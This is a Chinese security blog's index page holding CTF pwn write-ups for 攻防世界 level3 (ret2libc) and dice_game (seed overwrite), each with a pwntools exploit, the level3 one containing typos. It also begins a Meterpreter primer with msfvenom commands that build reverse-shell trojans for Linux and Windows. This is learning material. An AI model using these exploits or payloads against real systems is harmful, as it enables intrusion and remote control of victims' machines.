@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Sinky-wang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Sinky-wang">
+<meta property="og:url" content="https://sinky-wang.github.io/page/2/index.html">
+<meta property="og:site_name" content="Sinky-wang">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Sinky-wang">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+    <!--自定义看板娘-->
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="img/head.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sinky-wang</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="https://Sinky-wang.github.io">博客首页</a></li>
+                        
+                            <li><a  href="/archives">文章归档</a></li>
+                        
+                            <li><a  href="/CTFStudy">学习导航</a></li>
+                        
+                            <li><a  href="/PWNABLE">PWNABLE</a></li>
+                        
+                            <li><a  href="/resume">个人简历</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail"  target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                            
+                                <a class="fl github"  target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 13.33px;">漏洞战争</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://yunee.top/">yunee</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weik1.top/">weik1</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.abelche.com/">Abelche</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://prowes5.github.io">Prowers5</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sfishlost.com/">superfish</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://kirin-say.top/">Kirin</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://nobb.site/">Hcamael</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.giantbranch.cn/">giantbranch</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">总是找不到漏洞的二进制菜狗 微信：visionary243694 欢迎各位大佬指导</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Sinky-wang</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Sinky-wang</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="https://Sinky-wang.github.io">博客首页</a></li>
+                
+                    <li><a href="/archives">文章归档</a></li>
+                
+                    <li><a href="/CTFStudy">学习导航</a></li>
+                
+                    <li><a href="/PWNABLE">PWNABLE</a></li>
+                
+                    <li><a href="/resume">个人简历</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-攻防世界-pwn-level3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.450Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">攻防世界 level3</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p>
+<p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" alt="17627983-3b321a2edea9a331.png"></p>
+<p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p>
+<p>查看main()函数：</p>
+<p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" alt="17627983-fde84f52ba2311ab.png"></p>
+<p>查看函数function()：</p>
+<p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" alt="捕获.PNG"></p>
+<p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p>
+<blockquote>
+<p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p>
+</blockquote>
+<blockquote>
+<p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p>
+</blockquote>
+<blockquote>
+<p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p>
+</blockquote>
+<p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p>
+<p>某大佬攻击思路：</p>
+<p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p>
+<blockquote>
+<p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。</p>
+</blockquote>
+<p><strong>思路</strong> </p>
+<p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;111.198.29.45&#39;,52277)</span><br><span class="line"> # p&#x3D;process(&quot;.&#x2F;level3&quot;)</span><br><span class="line"> # 获取文件对象</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3&#39;)</span><br><span class="line"> #获取lib库对象</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class="line"> #获取函数</span><br><span class="line">wirte_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[write&#39;]</span><br><span class="line">main_addr&#x3D;elf.sym[&#39;main&#39;]</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="line">payload&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> #获取wirte在got中的地址</span><br><span class="line">write_got_addr&#x3D;u32(p.recv())</span><br><span class="line">print hex(write_got_addr)</span><br><span class="line"> # 计算lib库加载基址</span><br><span class="line">libc_base&#x3D;write_got_addr-libc.sym[&#39;write&#39;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"> # 计算system的地址</span><br><span class="line">system_addr&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #计算字符串&#x2F;bin&#x2F;sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;获取</span><br><span class="line">bin_sh_addr&#x3D;libc_base+0x15902b</span><br><span class="line">print hex(bin_sh_addr)</span><br><span class="line"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="line">payload2&#x3D;0x88*&#39;a&#39;+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="line"> #接受数据</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line"> #发送payloas</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> #切换交互模式</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.447Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">攻防世界-dice_game</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
+<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class="line">  if ( v6 &lt;&#x3D; 49 )</span><br><span class="line">    buf[v6 - 1] &#x3D; 0;</span><br><span class="line">  printf(&quot;Hi, %s. Let&#39;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  v8 &#x3D; 1;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Game %d&#x2F;50\n&quot;, v8);</span><br><span class="line">    v5 &#x3D; sub_A20();</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( v5 !&#x3D; 1 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8 &#x3D;&#x3D; 50 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_B28(buf);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye bye!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_B28(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  printf(&quot;Congrats %s\n&quot;, a1);</span><br><span class="line">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stream);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
+<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
+<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class="line">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a&#x3D;[]</span><br><span class="line">for i in range(50):</span><br><span class="line">    a.append(libc.rand()%6+1)</span><br><span class="line">print(a)</span><br><span class="line">for i in a:</span><br><span class="line">    p.recv()</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-初识Meterpreter" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/%E5%88%9D%E8%AF%86Meterpreter/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.444Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/%E5%88%9D%E8%AF%86Meterpreter/">初识Meterpreter</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p>
+<blockquote>
+<p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p>
+</blockquote>
+<h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p>
+<ul>
+<li><p>Linux:</p>
+<ul>
+<li>linux下反弹shell木马：</li>
+<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li>
+<li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li>
+<li>设置地址和端口，开始监听。</li>
+<li>运行反弹shell木马，成功反弹回shell</li>
+</ul>
+</li>
+<li><p>Windows:</p>
+<ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p>
+<p><code>payload: /windows/meterpreter/reverse_http</code></p>
+<h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p>
+<p><code>payload: /windows/meterpreter/reverse_https</code></p>
+<h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p>
+<p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p>
+<p>加权运行。</p>
+<h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p>
+<ul>
+<li><p>help –查看Meterpreter帮助</p>
+</li>
+<li><p>background –返回，把meterpreter后台挂起</p>
+</li>
+<li><p>bgkill –杀死一个背景 meterpreter 脚本</p>
+</li>
+<li><p>bglist –提供所有正在运行的后台脚本的列表</p>
+</li>
+<li><p>bgrun –作为一个后台线程运行脚本</p>
+</li>
+<li><p>channel –显示活动频道</p>
+</li>
+<li><p>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</p>
+</li>
+<li><p>sesssions -k  number  –与会话进行交互</p>
+</li>
+<li><p>close –关闭通道</p>
+</li>
+<li><p>exit –终止 meterpreter 会话</p>
+</li>
+<li><p>quit –终止 meterpreter 会话</p>
+</li>
+<li><p>interact id  –切换进一个信道</p>
+</li>
+<li><p>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</p>
+</li>
+<li><p>irb –进入 Ruby 脚本模式</p>
+</li>
+<li><p>read –从通道读取数据</p>
+</li>
+<li><p>write –将数据写入到一个通道</p>
+</li>
+<li><p>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</p>
+</li>
+<li><p>use –加载 meterpreter 的扩展</p>
+</li>
+<li><p>load/use –加载模块</p>
+</li>
+<li><p>Resource –执行一个已有的rc脚本</p>
